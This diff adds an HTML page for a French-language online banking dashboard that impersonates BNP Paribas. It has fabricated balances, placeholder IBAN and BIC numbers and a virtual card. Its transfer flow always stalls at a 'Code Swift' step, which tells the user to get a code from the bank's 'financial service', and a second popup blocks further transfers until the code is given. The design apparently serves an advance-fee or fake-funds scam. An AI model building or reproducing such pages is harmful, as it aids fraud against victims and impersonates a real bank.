@@ -1,0 +1,416 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Espaces Bancaires</title>
+   
+<link rel="stylesheet" href="account.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/all.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400..700&family=Edu+SA+Hand:wght@400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<script src="https://www.gstatic.com/firebasejs/10.12.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.1/firebase-database-compat.js"></script>
+</head>
+<body id="bd">
+    <div class="bgoverlay">
+
+    </div>
+    
+    <div class="account">
+         
+        <div class="main">
+            <header>
+              <nav>
+                <ul>
+                  <li>Paribas Bank <img src="https://firebasestorage.googleapis.com/v0/b/icecommerce-73a10.appspot.com/o/uploads%2F1752802104364.jpg?alt=media&token=1978e4f2-a213-453f-9b03-bc6d86ace823" alt="" srcset="" ></li>
+          
+           <button popovertarget="popup"><i class="fas fa-bars "id="bars" style=""></i> <i class="fas fa-user "id="users"></i></button>
+               
+                  <li onclick="logout()"> <a href="#">Deconnexion</a></li>      </ul>
+             
+              </nav>
+              
+          
+            </header>
+           
+             
+                <div class="ctn" id="popbank" popover style="display: none;">
+
+
+    <div class="container ">
+      
+      <div class="progress_container">
+        <div class="progress_bar"></div>
+        <div class="progress_circle active">
+          <span class="progress_span">1</span>
+          
+        </div>
+        <span class="bdr"></span>
+        <div class="progress_circle">
+          <span class="progress_span">2</span>
+  
+        </div>
+        <span class="bdr"></span>
+        <div class="progress_circle">
+          <span class="progress_span">3</span>
+        
+        </div>
+        <span class="bdr"></span>
+        <div class="progress_circle">
+          <span class="progress_span">4</span>
+        </div>
+      </div>
+<div class="bankoverlay" >
+     
+<div class="step">
+    <i class='fab fa-gg-circle' style="font-size:2em"></i>
+<h4>Informations Personnelles  </h4>
+<p>Vérification des informations personnelles confirmées</p>
+</div>
+<div class="step">
+    <i class='fab fa-gg-circle' style="font-size:2em"></i>
+<h4>Virements</h4>
+<p>Virement en cours de <span class="fa" id="mtntid" style="margin: 0 0.5em;"></span> 
+<p> <strong>Compte à Compte</strong></p>  <span id="bnpid">FR637462877988 vers<span class="fa" id="accid" style="margin: 0 0.5em;"></span></span>  </p>
+
+
+</div>
+<div class="step">
+   <i class='fab fa-gg-circle' style="font-size:2em"></i>
+  <h4>Décaissement des Fonds </h4>
+<p>Toutes les informations pour le décaissement des fonds vers le numéro bancaire <span class="fa" id="fnd" style="margin: 0 0.5em;">DE4793747928238</span> sont opérationnels au niveau des banques respectives</p>
+<h5>
+    C'est presque terminé 
+<i class='fab fa-google' style="font-size:1em;"></i>
+<i class='fas fa-wallet' style="font-size:1em"></i>
+<i class='fas fa-check' style="font-size:1.1em"></i>
+</h5>
+
+</div>
+<div class="step">
+   <div id="virstatus" style="display:none">
+       <h1>Virement en cours</h1>
+       <p>Un virement en cours peut prendre un délai de 3 jours au maximum pour arriver vers son destinataire </p>
+       <p>Veillez patienter et suivre votre opération</p>
+       <button type="button" id="closeid" class="btn btn-next" popovertarget="popbank" popovertargetaction="hide"onclick="closev()" >Fermez</button>
+   </div> 
+   <div id="mainvir">
+  <h3>Code Swift  <i class='fab fa-gg-circle' style="font-size:1.2em"></i></h3>
+<p>Saisisez vôtre code transfert du service BNP Paribas pour finaliser votre virement en cours</p>
+<p>Obtenir le code au près du service financier   BNP Paribas</p>
+<input type="text" name="" id="code" value="" />
+<div class="btn-flex" >
+  <button type="button" class="btn btn-first" onclick="sender()">Oui,je valide</button>
+ 
+   <button type="button" id="closeid" class="btn btn-next" popovertarget="popbank"onclick="closev()" >Fermez</button>
+  </div>
+    
+ </div>
+</div> 
+</div>
+      <div class="wrapper">
+
+      
+      </div>     
+</div>
+
+    </div>
+    </div>
+          <div id="popup" stypopover style="display:none">
+              <div id="google_translate_element">
+     </div>
+        <div class="card-menu-horizontal">
+            <div class="card-img">
+                <img src="./IMG_20230606_220012_905.jpg" alt="" id="url">
+            </div>
+        </div>
+        <div class="data-client">
+            <h2 id="name"></h2>
+            <p id="pays"> </p>
+            
+            <span> 
+                <i class="fa fa-check"> </i> </span> <span style="color:ligthgreen;">BNP  CLIENT VÉRIFIÉ</span>
+        </div>
+         <div class="data-keys">
+            <h3 > <i class="fa fa-lock"></i> Clé d'accès</h3>
+            <p id="keys"></p>
+        </div>
+         <div class="data-btn ">
+             <div class="">
+                 <button onclick="logout()" class="first-btn">Déconnexion <i class="fa fa-sign-out-alt"></i></button>
+                  <button id="btnid" type="button" popovertarget="popup" class="last-btn"poporvertargetaction="" >Oui,fermez </button>
+            </div> 
+          
+            
+        </div>
+          </div>
+          <div class="headgood">
+              
+   Félicitations,Votre Espace Bancaire est à vous, partagez une experience unique avec nous
+        </div>
+        <div class="menuhorizontal">
+            <div class="menuhorizon"><a href="#" onclick="slide(1)"><i class='fas fa-wallet' style='font-size:1em'></i>Comptes Bancaires</a></div>
+            <div class="menuhorizon"><a href="#"  onclick="slide(2)"><i class='fas fa-hand-holding-usd' style='font-size:1em'></i>Virements</a></div>
+            <div class="menuhorizon"><a href="#"  onclick="slide(3)"><i class='fas fa-file-invoice-dollar' style='font-size:1em'></i>Transactions</a></div>
+        </div>
+        <div class="form-transfert" id="form-transfertid">
+            <div class="form-head">
+               <div class="vir"> <div>Virements Bancaires</div><img src="https://firebasestorage.googleapis.com/v0/b/icecommerce-73a10.appspot.com/o/uploads%2F1752802104364.jpg?alt=media&token=1978e4f2-a213-453f-9b03-bc6d86ace823" alt="" srcset=""></div> 
+               <p>un moyen de servir vos proches a tout moment en utlisant votre carte virtuelle</p>
+            </div>
+          
+            <h4>Quel est votre type de compte bancaire</h4>
+            <div class="form-input">
+             <div>
+                  
+               <input type="radio" name="fav" id="checknumber" onclick="check(0)" checked> <label for="checknumber">Numéro de Compte</label>
+             </div>
+             
+              <div>  
+                <input type="radio" name="fav" id="checkiban"onclick="check(1)" value="0"> <label for="checkiban">IBAN (International Bank Number)</label></div>
+            </div>
+            <div class="form-input-text">
+            <div class="idcompte">
+                    <label for="checkiban" id="iban">IBAN <i class='far fa-credit-card'></i> </label>
+                    <input type="text" placeholder="Numéro de compte" id="ibantext" onchange="verifybanke(this) " value="" >
+                    <div class="info"></div>
+                </div>
+                
+                <div class="idcompte">
+                    <label for=""></label>
+                    <button type="button" id="bankid" popovertarget="popbank" >transferer </button>
+                </div>
+                <div id="popblok" popover style="display:none">
+        
+        <div class="step transit">
+    
+  
+   <div id="virstatusl" style="display:n">
+       <h3>Virements  en Cours ...<i class='fab fa-gg-circle' style="font-size:1.2em"></i></h3>
+       <p>Un virement en cours peut prendre un délai de 3 jours au maximum pour arriver vers son destinataire </p>
+       <p>Veillez patienter et suivre votre opération</p>
+       <div class="btn-flex" >
+  
+   <button type="button" id="vircheck" type="button" class="btn btn-next" popovertarget="popblok" popovertargetaction="hidden" onclick="closevir()" >Fermez</button>
+  </div>
+   </div> 
+  <div id="mainvire">
+       <h3>Code Swift  <i class='fab fa-gg-circle' style="font-size:1.2em"></i></h3>
+<p >Pour initier un autre virement ,veillez terminer le  virement lancé ultérieurement qui est en cours d'exécution </p>
+<p>Obtenir le code au près du service financier   BNP Paribas</p>
+<input type="text" name="" id="codevir" value="" />
+
+<div class="btn-flex" >
+  <button type="button" class="btn btn-first" onclick="senderload()">Oui,je valide</button>
+ 
+   <button type="button"  class="btn btn-next" popovertarget="popblok" popovertargetaction="hidden" >Fermez</button>
+  </div>
+  </div>
+
+    
+ 
+</div>
+         
+         
+          </div>
+            </div>
+          
+        </div>
+       <div class="soldetype" id="slideid">
+        <div class="soldeitem">
+            <i class='fab fa-gg-circle' style="font-size:2em"></i>
+            <div class="soldehead">
+                Solde Total
+            </div>
+            <div class="soldcost">
+                <div class="cost">  <i class='fa sign' style="font-size:1em"></i></div> <span id="soldt"></span>
+            </div>
+            <div class="flexbankDate">
+                <div class="bankname">BNP PARIBAS BANQUE </div>
+                <i class='fas fa-calendar' style='font-size:1em'></i><div class="date" id="dt"></div>
+        </div>
+
+
+
+
+
+        </div>
+        <div class="soldeitem">
+            <i class='fab fa-gg-circle' style="font-size:2em"></i>
+            <div class="soldehead">
+            Retrait 
+        </div>
+        <div class="soldcost">
+            <div class="cost"><i class='fa sign' style="font-size:1em"></i></div><span id="rtr"></span>
+        </div>
+        <div class="flexbankDate">
+            <div class="bankname">BNP PARIBAS BANQUE </div>
+             <i class='fas fa-calendar' style='font-size:1em'></i>
+            <div class="date" id="dt"></div>
+    </div>
+</div>
+        <div class="soldeitem"> 
+            <i class='fab fa-gg-circle' style="font-size:2em"></i>
+            <div class="soldehead">
+         Dépôt 
+        </div>
+        <div class="soldcost">
+            <div class="cost"><i class='fa sign' style="font-size:1em"></i></div><span id="dept"></span>
+        </div>
+        <div class="flexbankDate">
+            <div class="bankname">BNP PARIBAS BANQUE </div>
+             <div class="mbl-300">
+               <div> <i class='fas fa-calendar' style='font-size:1em'></i></div> <div class="date" id="dt"></div>
+            </div></div>
+</div>
+
+       </div>
+       <div class="transfert">
+        <div class="transfertItem">
+            <div class="cardimg">
+                <img src="https://firebasestorage.googleapis.com/v0/b/icecommerce-73a10.appspot.com/o/uploads%2Frealistic-credit-card-design_23-2149126093.jpg?alt=media&token=97e5b9a0-4203-499e-b3b1-243f4c3c86cc" alt="" srcset=""  >
+            </div>
+           <div class="cardtitle">
+            <div class="maintitle">
+                Carte Virtuelle  <i class='far fa-credit-card' style='font-size:1em;margin: 0em 0.5em;'></i>
+            </div>
+            <div class="mediumtitle">
+                <i class='fas fa-clock' style='font-size:1em;margin: 0 0.5em;'></i> Expire
+            </div>
+           </div>
+           <div class="detailstitle">
+            <div class="inter">Internationale</div>
+            <div class="inter" id="it"></div>
+           </div>
+           <div class="coordinate">
+            Coordonées Bancaires <i class='far fa-credit-card'style="margin:0em 0.5em"></i>
+           </div>
+           <div class="details">
+            <div class="iban">
+                IBAN
+            </div>
+            <div class="ibantext">
+                <p>FR458754768856722</p>
+            </div>
+            <div class="iban">
+                BIC
+            </div>
+            <div class="ibantext">
+                <p>87547688HYHFHH</p>
+            </div>
+           </div>
+        </div>
+        <div class="transfertItem">
+           <div class="item">
+            <div class="depot">
+                Dépot <i class='fas fa-piggy-bank' style='font-size:1em;margin: 0 0.3em;'></i>
+            </div>
+            <div class="mind">
+                minimum
+            </div>
+            <div class="soldcosti">
+                <div class="costi"><i class='fa sign' style="font-size:1em;"></i></div>250.000
+            </div>
+           
+           </div>
+           <div class="item">
+            <div class="depot">
+                Dépot <i class='fas fa-piggy-bank' style='font-size:1em;margin: 0 0.3em'></i>
+            </div>
+            <div class="mind">
+                maximum
+            </div>
+            <div class="soldcosti">
+                <div class="costi"><i class='fa sign' style="font-size:1em"></i></div>820.000000
+            </div>
+          
+           </div>
+           
+        </div>
+        <div class="transfertItem">
+            <div class="overviews">
+                <div class="cardtitle">
+                 Besoin de liquides ou des espèces? Servez vous de votre carte virtuelle pour vos transactions aux quotidiens
+                </div>
+                <p>Retirer de l'argent de votre carte virtuelle en cliquant le bouton ci dessous</p>
+                <button type="button"style="background:#9dd8be">Transferer <i class='fas fa-credit-card' style="font-size:1em;margin: 0 0.2em;"></i></button>
+            </div>
+            <div class="overviewsimg">
+ 
+     
+    
+    
+    </div>
+            </div>
+        </div>
+       </div>
+    </div>
+    <div id="overlay">
+    
+    </div>
+    <div class="transactions-list" id="transId">
+        <div class="transactionhead">
+           <span class="largehead"> Transactions</span> <button type="button" onclick="cancel()">Close</button>
+        </div>
+      <div id="listId">
+       
+         
+          
+    </div>  
+     <div class="plus">
+        <button type="button" onclick="addList()" >voir plus</button>
+     </div>
+     
+    </div>
+    
+<script  src="account.js" ></script>
+<script type="text/javascript">
+    
+   const googleId=document.getElementById("google_translate_element")
+   let lang=getCookie("lang")
+   function googleTranslateElementInit() {
+
+   new google.translate.TranslateElement({pageLanguage: "fr",includedLanguages:lang,autoDisplay: false}, 'google_translate_element');
+     setTimeout(triggerTranslation, 1000);
+     
+   }
+  
+  
+  function triggerTranslation() {
+
+
+
+const select = document.querySelector('.goog-te-combo');
+
+if (select) {
+
+
+
+select.value = ''+lang;
+
+
+
+select.dispatchEvent(new Event('change'));
+
+}
+
+}
+function getCookie(name) {
+  const cookies = document.cookie.split(';');
+  for (let cookie of cookies) {
+    const [cookieName, cookieValue] = cookie.trim().split('=');
+    if (cookieName === name) return decodeURIComponent(cookieValue);
+  }
+  return null;
+}
+   </script>
+   
+   <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</html>
